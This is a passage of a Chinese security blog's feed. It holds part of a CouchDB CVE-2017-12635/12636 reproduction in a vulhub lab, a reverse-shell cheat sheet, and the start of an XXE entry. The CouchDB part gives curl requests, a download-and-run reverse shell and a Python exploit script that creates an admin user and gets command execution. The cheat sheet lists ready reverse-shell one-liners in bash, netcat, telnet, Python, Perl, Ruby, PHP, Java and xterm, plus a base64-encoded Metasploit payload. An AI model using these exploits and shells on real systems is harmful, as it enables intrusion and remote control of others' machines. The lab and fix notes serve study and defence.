&apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103757607.png" alt="1531103757607"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>注意：反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，遂此处分为两步去实现（还有其他方法，仁者见仁） 。</p><p>终于知道为啥我直接反弹shell不成功了，瞎搞半天。</p><p>在/home/目录下 新建index.html，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.190.128/9000 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>终端运行，端口被占用了就换个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8013</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111709563.png" alt="1531111709563"></p><p>curl 或者 p牛的代码执行下面两条command，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.190.128:8013/ -o /tmp/bashshell</span><br><span class="line">bash /tmp/bashshell</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111818648.png" alt="1531111818648"></p><p>p牛代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/7/8</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : Couchdb-Exp</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://192.168.190.128:5984'</span></span><br><span class="line"><span class="comment"># command = '"bash -i &gt;&amp; /dev/tcp/192.168.190.128/12000 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># command = '"curl 192.168.190.128:8013/ -o /tmp/bashshell"'</span></span><br><span class="line"><span class="comment"># command = '"bash /tmp/bashshell"'</span></span><br><span class="line">version = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     'http': 'http://127.0.0.1:8085'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">'/_users/org.couchdb.user:wooyun'</span>, data=<span class="string">'''&#123;</span></span><br><span class="line"><span class="string">  "type": "user",</span></span><br><span class="line"><span class="string">  "name": "wooyun",</span></span><br><span class="line"><span class="string">  "roles": ["_admin"],</span></span><br><span class="line"><span class="string">  "roles": [],</span></span><br><span class="line"><span class="string">  "password": "wooyun"</span></span><br><span class="line"><span class="string">&#125;'''</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">'wooyun'</span>, <span class="string">'wooyun'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">'/_config/query_servers/cmd'</span>), data=command)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">'/_membership'</span>).json()[<span class="string">'all_nodes'</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">'/_node/&#123;&#125;/_config/query_servers/cmd'</span>.format(host), data=command)</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">'/wooyun'</span>)</span><br><span class="line">session.put(target + <span class="string">'/wooyun/test'</span>, data=<span class="string">'&#123;"_id": "wooyuntest"&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">'/wooyun/_temp_view?limit=10'</span>, data=<span class="string">'&#123;"language":"cmd","map":""&#125;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">'/wooyun/_design/test'</span>, data=<span class="string">'&#123;"_id":"_design/test","views":&#123;"wooyun":&#123;"map":""&#125; &#125;,"language":"cmd"&#125;'</span>)</span><br></pre></td></tr></table></figure><h3 id="漏洞修复建议："><a href="#漏洞修复建议：" class="headerlink" title="漏洞修复建议："></a><strong>漏洞修复建议</strong>：</h3><hr><p>1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在<code>/etc/couchdb/local.ini</code>文件中找到 <code>“bind_address = 0.0.0.0”</code> ，把 <code>0.0.0.0</code>修改为 <code>127.0.0.1</code> ，然后保存。注：修改后只有本机才能访问CouchDB。</p><p>2、设置访问密码 （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code> 中找到“[admins]”字段配置密码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vulhub.org/#/environments/couchdb/CVE-2017-12635/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulhub.org/#/environments/couchdb/CVE-2017-12635/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vulhub.org/#/environments/couchdb/CVE-2017-12636/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulhub.org/#/environments/couchdb/CVE-2017-12636/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/course/60383&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.ichunqiu.com/course/60383&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="数据库" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="CVE" scheme="http://blog.Lhaihai.wang/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Linux反弹shell解析和总结</title>
    <link href="http://blog.Lhaihai.wang/2018/07/08/Linux%E5%8F%8D%E5%BC%B9shell%E8%A7%A3%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.Lhaihai.wang/2018/07/08/Linux反弹shell解析和总结/</id>
    <published>2018-07-08T13:45:19.000Z</published>
    <updated>2018-07-09T06:30:54.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/" target="_blank" rel="noopener">http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/</a></p><p><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85712</a></p><h2 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h2><h2 id="自带工具"><a href="#自带工具" class="headerlink" title="自带工具"></a>自带工具</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>针对不同的linux版本，可能有不同的利用方式，这里简单列一下，在使用的时候自行测试。</p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>netcat使我们常用nc，不同的版本有不同的利用方式，所以需要依次测试才能得到真正可用的。</p><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>支持 - e 选项 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure><h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>安装的 NC 版本有问题时： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>不能使用 - e 选项时： </p><h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c /bin/sh attackerip 4444</span><br></pre></td></tr></table></figure><h4 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip 4444</span><br></pre></td></tr></table></figure><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p>(nc 不可用或 / dev/tcp 不可用时)</p><p>telnet客户端作为一个远程管理设备的软件，也可以作为反弹shell的软件</p><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure><p>远程服务器监听tcp的4445端口</p><h4 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h2 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h2><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python作为一个优秀的脚本语言通常默认安装在各大linux操作系统中，可以做很多事情。</p><h4 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><h4 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br></pre></td></tr></table></figure><p>另外 Metasploit 版的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.1</span> </span><br><span class="line">LPORT=<span class="number">1234</span></span><br><span class="line"><span class="keyword">import</span> base64; exec(base64.b64decode(<span class="string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='</span>))</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><h4 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><h4 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h4><p>不依赖于 / bin/sh 的 shell： 这条语句比上面的更为简短，而且确实不需要依赖 / bin/sh </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h4 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><h4 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><h4 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h4><p>不依赖于 / bin/sh 的 shell： </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h4 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h4><p>如果目标系统运行 Windows： </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>linux下还有一些不常见的工具也可以实现这些功能。</p><h3 id="gawk"><a href="#gawk" class="headerlink" title="gawk"></a>gawk</h3><p>GNU AWK (GAWK) 是历史悠久的 AWK 编程语言的开放源代码实现，可用于所有的 UNIX® 系统。AWK 语言是一种 UNIX 备用工具，它是一种功能强大的文本操作和模式匹配语言，特别适用于进行信息检索，这使得它非常适合用于当今的数据库驱动的应用程序。因为它集成于 UNIX 环境，所以可以设计、构建和快速地执行完整的工作程序，并且立即就能得到结果。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/2264987127.jpg" alt="1.jpg"></p><h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>xterm是一个X Window System上的标准虚拟终端。用户可以在同一个显示器上开启许多xterm，每一个都为其中运行的进程提供独立的输入输出（一般来说此进程是Unix shell）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure><p>以上命令在目标服务器上执行会反连shell到10.0.0.1的6001端口。</p><p>在10.0.0.1上如何监听获取shell，需要执行一下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure><p>使用以下命令授权远程主机连接到本机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>（找不到从哪里copy来了，=.=）</p><p>反弹的核心是和目标系统建立连接(如果中间被防火墙阻断了,那你就要想办法了,尤其当你一个较低的权限在操作时,这里只是单纯的把shell弹回来,至于其他的各种问题,后续再说),</p><p>不管你用系统的管道也好,用各种语言提供的socket函数也好,反正最后的目的只有一个,我们只是需要一个目标系统的shell……基于现有这些思路,其实,还可以衍生出来非常多的shell反弹方式,大家只要敢开脑洞就好了,理解反弹shell的本质比直接抄来就用会好很多,</p><p>其实,有时候真的并不需要自己多么多高的智商,你只需要站在前人的肩膀上,基于现有的资源条件下不断衍生出自己的想法并加以实践这就足以变的强大起来,虽然,会慢人一步,但那只是暂时的,厚积薄发,融会贯通嘛,贵在坚持 </p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">https://klionsec.github.io/2016/09/27/revese-shell/</a></p><p><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/237/</a></p><p><a href="http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p><a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p><p><a href="http://www.91ri.org/6620.html" target="_blank" rel="noopener">http://www.91ri.org/6620.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/85712&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/85712&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;反弹shell的各种姿势&quot;&gt;&lt;a href=&quot;#反弹shell的各种姿势&quot; class=&quot;headerlink&quot; title=&quot;反弹shell的各种姿势&quot;&gt;&lt;/a&gt;反弹shell的各种姿势&lt;/h2&gt;&lt;h2 id=&quot;自带工具&quot;&gt;&lt;a href=&quot;#自带工具&quot; class=&quot;headerlink&quot; title=&quot;自带工具&quot;&gt;&lt;/a&gt;自带工具&lt;/h2&gt;&lt;h3 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h3&gt;&lt;p&gt;针对不同的linux版本，可能有不同的利用方式，这里简单列一下，在使用的时候自行测试。&lt;/p&gt;
&lt;h4 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.Lhaihai.wang/categories/Linux/"/>
    
    
      <category term="shell" scheme="http://blog.Lhaihai.wang/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞理解与测试</title>
    <link href="http://blog.Lhaihai.wang/2018/07/08/XXE%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3%E4%B8%8E%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.Lhaihai.wang/2018/07/08/XXE漏洞理解与测试/</id>
    <published>2018-07-08T07:49:10.000Z</published>
    <updated>2018-07-08T07:56:46.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为何一直复现不成功"><a href="#为何一直复现不成功" class="headerlink" title="为何一直复现不成功"></a>为何一直复现不成功</h2><p>远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy)</p><p>(捣鼓了两天心好痛)</p><p>（copy 来自 <a href="https://lightless.me/archives/Research-On-XXE.html）" target="_blank" rel="noopener">https://lightless.me/archives/Research-On-XXE.html）</a></p><p>之前我一直在自己的 ubuntu14.04+lnmp 的环境下测试的时候，一直不能复现这个问题，只在 kali 的某个版本上复现成功了，一直不知道原因。直到最近发现了这两个东西：<br><a href="http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml" target="_blank" rel="noopener">http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml</a><br><a href="http://php.net/manual/en/libxml.constants.php" target="_blank" rel="noopener">http://php.net/manual/en/libxml.constants.php</a></p><p>主要是<code>simplexml_load_file</code>这个函数的问题，在旧版本中是默认解析实体的，但是在新版本中，已经不再默认解析实体了，需要在 simplexml_load_file 函数中指定第三个参数为<code>LIBXML_NOENT</code>，不然不会解析实体的。</p><blockquote><p>大部分关于 XXE 的内容都可以参考这篇文章：<a href="http://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">http://security.tencent.com/index.php/blog/msg/69</a></p></blockquote><p>（copy 来自 <a href="http://www.freebuf.com/column/156863.html）" target="_blank" rel="noopener">http://www.freebuf.com/column/156863.html）</a></p><p>libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 